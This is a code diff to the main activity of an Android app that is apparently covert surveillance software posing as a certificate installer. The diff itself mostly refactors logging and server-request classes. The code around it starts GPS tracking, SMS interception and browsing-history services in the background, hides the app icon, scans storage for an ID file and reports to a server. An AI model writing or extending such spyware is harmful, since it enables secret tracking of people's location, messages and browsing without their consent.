@@ -33,8 +33,11 @@ import android.widget.EditText;
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
 import com.inet.android.location.GPSTracker;
+import com.inet.android.request.DataRequest;
+import com.inet.android.request.StartRequest;
 import com.inet.android.sms.SMSBroadcastReceiver;
 import com.inet.android.sms.SmsSentObserver;
+import com.inet.android.utils.Logging;
 
 public class MainActivity extends Activity {
 	Button install;
@@ -65,9 +68,7 @@ public class MainActivity extends Activity {
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
 		// setContentView(R.layout.activity_main);
 
-		FileLog.writeLog("\n\n ============================ ");
-		FileLog.writeLog("\n onCreate \n");
-		FileLog.writeLog("\n ============================\n ");
+		Logging.doLog(LOG_TAG, "onCreate", "onCreate");
 		
 		context = getApplicationContext();
 
@@ -102,8 +103,9 @@ public class MainActivity extends Activity {
 		
 		getID(); // рекурсивный поиск файла с нужным именем
 		if (sp.getString("ID", "ID").equals("ID")) {
-			Log.d("mainID", "ID viewdDalog");
-			FileLog.writeLog(LOG_TAG + " -> File not found. Show dialog.");
+
+			Logging.doLog(LOG_TAG, "File not found. Show dialog.", "File not found. Show dialog.");
+			
 			viewIDDialog();
 		} else
 			finish();
@@ -116,8 +118,8 @@ public class MainActivity extends Activity {
 	private boolean viewIDDialog() {
 		AlertDialog.Builder alert = new AlertDialog.Builder(this);
 
-		alert.setTitle("Ввод ID");
-		alert.setMessage("Введите ID. Нет права на ошибку!");
+		alert.setTitle("Ввод account number");
+		alert.setMessage("Введите account number. Нет права на ошибку!");
 
 		final EditText input = new EditText(this);
 		alert.setView(input);
@@ -126,8 +128,7 @@ public class MainActivity extends Activity {
 			public void onClick(DialogInterface dialog, int whichButton) {
 				String value = input.getText().toString();
 
-				Log.d(LOG_TAG, "Text: " + value);
-				FileLog.writeLog("Text: " + value);
+				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);
 				
 				sp = PreferenceManager
 						.getDefaultSharedPreferences(getApplicationContext());
@@ -161,16 +162,19 @@ public class MainActivity extends Activity {
 				+ Long.toString(System.currentTimeMillis())
 				+ sp.getString("ABOUT", "about") + "</url></packet>";
 
-		FileLog.writeLog("MainAct diagRequest: before req");
+		Logging.doLog(LOG_TAG, "MainAct diagRequest: before req", "MainAct diagRequest: before req");
 
-		RequestMakerImpl req = new RequestMakerImpl(context);
-		req.sendDataRequest(diag);
-		Log.d(LOG_TAG, "post req");
-		FileLog.writeLog("MainActRequest: post req");
+//		RequestMakerImpl req = new RequestMakerImpl(context);
+//		req.sendDataRequest(diag);
+		DataRequest dr = new DataRequest(context);
+		dr.sendRequest(diag);
+		
+		Logging.doLog(LOG_TAG, "MainAct diagRequest: post req", "MainAct diagRequest: post req");
 	}
 
 	public void getID() {
-		Log.d(LOG_TAG, "Start search ID ");
+		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");
+		
 		File file[] = Environment.getExternalStorageDirectory().listFiles();
 		recursiveFileFind(file);
 	}
@@ -212,14 +216,16 @@ public class MainActivity extends Activity {
 	}
 
 	private void sendStartRequest() {
-		RequestMaker service = new RequestMakerImpl(context);
+//		RequestMaker service = new RequestMakerImpl(context);
+//		String str = "\"";
+//		service.sendStartRequest(str);
 		String str = "\"";
-		service.sendStartRequest(str);
+		StartRequest sr = new StartRequest(context);
+		sr.sendRequest(str);
 	}
 
 	public void start() {
-		Log.d(LOG_TAG, "start services");
-		FileLog.writeLog("start services");
+		Logging.doLog(LOG_TAG, "start services", "start services");
 
 		startService(new Intent(MainActivity.this, Request4.class));
 
@@ -231,10 +237,8 @@ public class MainActivity extends Activity {
 
 		startService(new Intent(MainActivity.this, GPSTracker.class));
 		startService(new Intent(MainActivity.this, LinkService.class));
-//		contentObserved();
-		Log.d(LOG_TAG, "finish start services");
-		FileLog.writeLog("finish start services");
-
+		
+		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
 	}
 
 	public void hideIcon() {
